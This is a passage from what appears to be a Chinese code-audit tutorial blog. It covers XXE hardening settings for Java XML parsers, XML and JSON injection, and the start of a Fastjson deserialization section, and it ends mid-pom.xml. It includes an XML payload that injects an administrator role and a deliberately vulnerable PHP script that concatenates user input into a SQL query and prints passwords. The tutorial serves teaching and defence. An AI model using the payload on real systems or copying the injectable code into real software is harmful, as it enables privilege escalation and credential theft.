class="hljs-variable">document</span> <span class="hljs-operator">=</span> reader.read(request.getInputStream());<br>        <span class="hljs-type">Element</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> document.getRootElement();<br>        <span class="hljs-keyword">return</span> root.getText();<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>审计：</strong></p><ol><li>判断使用哪种XML解析器</li><li>搜索是否有禁用外部实体配置（修护部分有具体代码）</li><li>是否有外部输入点进行解析</li></ol><p><strong>修护：</strong></p><ol><li>saxReader</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Java">saxReader.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>); <br>saxReader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>); <br>saxReader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><ol><li>saxBuilder</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">SAXBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXBuilder</span>(); <br>builder.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>,<span class="hljs-literal">true</span>); <br>builder.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>); <br>builder.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br><span class="hljs-type">Document</span> <span class="hljs-variable">doc</span> <span class="hljs-operator">=</span> builder.build(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(fileName));<br></code></pre></td></tr></table></figure><ol><li>saxTransformerFactory</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">SAXTransformerFactory</span> <span class="hljs-variable">sf</span> <span class="hljs-operator">=</span> SAXTransformerFactory.newInstance(); sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="hljs-string">&quot;&quot;</span>); sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="hljs-string">&quot;&quot;</span>); <br>sf.newXMLFilter(Source);<br><br>Note: Use of the following XMLConstants <span class="hljs-keyword">requires</span> JAXP <span class="hljs-number">1.5</span>, which was added to Java in 7u40 and Java <span class="hljs-number">8</span>: <br>javax.xml.XMLConstants.ACCESS_EXTERNAL_DTD<br>javax.xml.XMLConstants.ACCESS_EXTERNAL_SCHEMA javax.xml.XMLConstants.ACCESS_EXTERNAL_STYLESHEET<br></code></pre></td></tr></table></figure><ol><li>schemaFactory</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">SchemaFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> SchemaFactory.newInstance(<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>); factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="hljs-string">&quot;&quot;</span>); factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-type">Schema</span> <span class="hljs-variable">schema</span> <span class="hljs-operator">=</span> factory.newSchema(Source);<br></code></pre></td></tr></table></figure><ol><li>xmlInputFactory</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="hljs-literal">false</span>); <span class="hljs-comment">// This disables DTDs entirely for that factory</span><br><br>xmlInputFactory.setProperty(<span class="hljs-string">&quot;javax.xml.stream.isSupportingExternalEntities&quot;</span>, <span class="hljs-literal">false</span>); <span class="hljs-comment">// disable external entities</span><br></code></pre></td></tr></table></figure><ol><li>xmlReader</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">XMLReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> XMLReaderFactory.createXMLReader(); <br>reader.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>); <br>reader.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="hljs-literal">false</span>); <span class="hljs-comment">// This may not be strictly required as DTDs shouldn&#x27;t be allowed at all, per previous line.</span><br>reader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>); <br>reader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><ol><li>XPathExpression</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">df</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance(); df.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="hljs-string">&quot;&quot;</span>); <br>df.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> df.newDocumentBuilder();<br><span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XPathExpression</span>().evaluate( builder.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(xml.getBytes())) );<br></code></pre></td></tr></table></figure><ol><li>transformerFactory</li></ol><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pf">TransformerFactory tf = TransformerFactory.newInstance(); <br>tf.<span class="hljs-built_in">set</span>Attribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="hljs-string">&quot;&quot;</span>); tf.<span class="hljs-built_in">set</span>Attribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="hljs-string">&quot;&quot;</span>);<br></code></pre></td></tr></table></figure><ol><li>Validator</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">SchemaFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> SchemaFactory.newInstance(<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>); <br><span class="hljs-type">Schema</span> <span class="hljs-variable">schema</span> <span class="hljs-operator">=</span> factory.newSchema();<br><span class="hljs-type">Validator</span> <span class="hljs-variable">validator</span> <span class="hljs-operator">=</span> schema.newValidator(); <br>validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="hljs-string">&quot;&quot;</span>); validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="hljs-string">&quot;&quot;</span>);<br></code></pre></td></tr></table></figure><ol><li>Unmarshaller</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">SAXParserFactory</span> <span class="hljs-variable">spf</span> <span class="hljs-operator">=</span> SAXParserFactory.newInstance(); <br>spf.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>); spf.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>); spf.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="hljs-literal">false</span>); <br><span class="hljs-type">Source</span> <span class="hljs-variable">xmlSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXSource</span>(spf.newSAXParser().getXMLReader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(xml)));<br><span class="hljs-type">JAXBContext</span> <span class="hljs-variable">jc</span> <span class="hljs-operator">=</span> JAXBContext.newInstance(Object.class);<br><span class="hljs-type">Unmarshaller</span> <span class="hljs-variable">um</span> <span class="hljs-operator">=</span> jc.createUnmarshaller();<br>um.unmarshal(xmlSource);<br></code></pre></td></tr></table></figure><p>一个用户，如果他被允许输入结构化的XML片段，则他可以在 XML 的数据域中<code>注入 XML 标签</code>来改写目标 XML 文档的结构与内容。</p><p><strong>示例</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createXMLStream</span><span class="hljs-params">(BufferedOutputStream outStream, User user)</span> <span class="hljs-keyword">throws</span> IOException<br>&#123;<br>String xmlString;<br>xmlString = <span class="hljs-string">&quot;&lt;user&gt;&lt;role&gt;operator&lt;/role&gt;&lt;id&gt;&quot;</span> + user.getUserId()<br>+<span class="hljs-string">&quot;&lt;/id&gt;&lt;description&gt;&quot;</span> + user.getDescription() +<br><span class="hljs-string">&quot;&lt;/description&gt;&lt;/user&gt;&quot;</span>;<br>outStream.write(xmlString.getBytes());<br>outStream.flush();<br>&#125;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">hhh<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">role</span>&gt;</span>administrator<span class="hljs-tag">&lt;/<span class="hljs-name">role</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>hhh<br></code></pre></td></tr></table></figure><p><strong>审计方法：</strong></p><p>全局搜索如下字符串</p><ul><li>xml</li><li>StreamSource</li><li>XMLConstants</li><li>StringReader</li><li>xmlString</li></ul><p>在项目中搜索. Xsd 文件</p><h5 id="json注入"><a href="#json注入" class="headerlink" title="json注入"></a>json注入</h5><p>json全称是JavaScript object notation。即JavaScript对象标记法，使用键值对进行信息的存储。</p><p>JSON是用来传输和存储数据的，其作用类似于XML，但是JSON 比 XML 更小、更快，更易解析。</p><p>以下请求报文是以JSON格式传输数据（其请求体是JSON格式的数据，其作用是上传PDF文件）：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/uploadPdf</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json;charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>862<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>R2iL9iJ4SFWJDpYY4pb_YfduHmFfKzpsNWiL-XZeXx7-5aTw24asso6HFj1<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;basic&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;token&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;eyJhbGciOiJITUFDU0hBMjU2IiwidmVyIjoiMS4xIn0=&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;dataType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;book&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;渗透测试.pdf&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p><strong>JSON语法</strong></p><ul><li>数据在名称&#x2F;值对中</li><li>数据由逗号分隔</li><li>大括号保存对象</li><li>中括号保存数组</li></ul><p><strong>JSON 值</strong></p><ol><li>数字（整数或浮点数）：{“age”:30 }</li><li>字符串（在双引号中） ：{“uname”:“yang”}</li><li>逻辑值（true 或 false）：{“flag”:true }</li><li>数组（在中括号中）：{“sites”:[{“name”:“yang”}，{“name”:“ming”}]}</li><li>对象（在大括号中）JSON 对象在大括号（{}）中书写： null { “runoob”:null }</li></ol><p><strong>JSON注入</strong></p><p>JSON注入是指应用程序所解析的JSON数据来源于不可信赖的数据源，程序没有对这些不可信赖的数据进行验证、过滤，如果应用程序使用未经验证的输入构造 JSON，则可以更改 JSON 数据的语义。在相对理想的情况下，攻击者可能会插入无关的元素，导致应用程序在解析 JSON数据时抛出异常。</p><p>简单点来说就是，攻击者可以在JSON数据内任意插入特殊符号，破坏JSON结构，从而导致JSON数据无法被解析。</p><p><strong>JSON注入的类型</strong></p><ul><li>通过插入特殊符号“””、“\”来破坏JSON结构，从而导致JSON数据无法被解析。</li><li>JSON数据后面拼接逻辑判断等注入语句，从而导致攻击者可以恶意查询后台&#x2F;数据库数据（思路和SQL注入是一样的）。</li></ul><p><strong>插入特殊符号导致JSON结构被破坏</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;dataType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;book&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;渗透测试.pdf&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;dataType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;book&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;渗透测试&quot;</span>.pdf<span class="hljs-string">&quot;&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;dataType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;book&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;渗透测试\.pdf&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>这时候JSON语句的结构也会被破坏，因为 \ 会把后面的 “ 转义，从而导致该语句无法被服务器解析。</p><p>由于 JSON 是根据引号、冒号、逗号和花括号区分各字符意义的，所以我们可以想方设法地在JSON语句中插入上述符号来达到破坏JSON结构的目的。</p><p><strong>拼接注入语句，非法查询后台&#x2F;数据库数据</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;json&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$json_str</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;json&#x27;</span>];<br>    <span class="hljs-variable">$json</span>=<span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json_str</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$json</span>)&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;JSON文档格式有误，请检查&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$username</span>=<span class="hljs-variable">$json</span>-&gt;username;<br>    <span class="hljs-comment">//$passwd=$json-&gt;passwd;</span><br> <br>    <span class="hljs-variable">$mysqli</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>();<br>    <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$mysqli</span>-&gt;connect_errno)&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;数据库连接失败：&#x27;</span>.<span class="hljs-variable">$mysqli</span>-&gt;connect_error);<br>    &#125;<br>    <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">select_db</span>(<span class="hljs-string">&#x27;user&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$mysqli</span>-&gt;errno)&#123;<br>      <span class="hljs-title function_ invoke__">dir</span>(<span class="hljs-string">&#x27;打开数据库失败：&#x27;</span>.<span class="hljs-variable">$mysqli</span>-&gt;error);<br>    &#125;<br>    <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">set_charset</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>);<br>    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT username,paawd FROM users WHERE username=&#x27;<span class="hljs-subst">&#123;$username&#125;</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span>=<span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$result</span>)&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;执行SQL语句失败：&#x27;</span>.<span class="hljs-variable">$mysqli</span>-&gt;error);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows==<span class="hljs-number">0</span>)&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;查询结果为空&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-variable">$array1</span>=<span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_all</span>(MYSQLI_ASSOC);<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;用户名：<span class="hljs-subst">&#123;$array1[0][&#x27;username&#x27;]&#125;</span>,密码：<span class="hljs-subst">&#123;$array1[0][&#x27;paawd&#x27;]&#125;</span>&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">free</span>();<br>    <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="Fastjson反序列化"><a href="#Fastjson反序列化" class="headerlink" title="Fastjson反序列化"></a>Fastjson反序列化</h5><p>漏洞点：客户端发送json数据，造成json数据可更改，实现任意类的反序列化</p><p>在1.2.49开始，JSONArray以及JSONObject方法开始有了自己的readObject方法</p><p><img src="image-20240511214151500.png" alt="image-20240511214151500"></p><p>在其SecureObjectInputStream类重写了resolveClass，通过调用checkAutoType方法做类检查</p><p>当触发反序列化时，将反序列化过程委托给SecureObjectInputStream处理时，触发resolveClass实现对恶意类的拦截</p><p>不安全的反序列化过程</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl">O<span class="hljs-function"><span class="hljs-title">bjectInputStream</span> -&gt;</span> readObject<br>xxxxxx(省略中间过程)<br>S<span class="hljs-function"><span class="hljs-title">ecureObjectInputStream</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">readObject</span> -&gt;</span> resolveClass<br><br></code></pre></td></tr></table></figure><p>安全的反序列化过程</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">T<span class="hljs-function"><span class="hljs-title">estInputStream</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">readObject</span> -&gt;</span> resolveClass<br></code></pre></td></tr></table></figure><p>ShiroAndFastJson-master项目</p><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.4.5<span class="hljs-tag">&lt;/<span 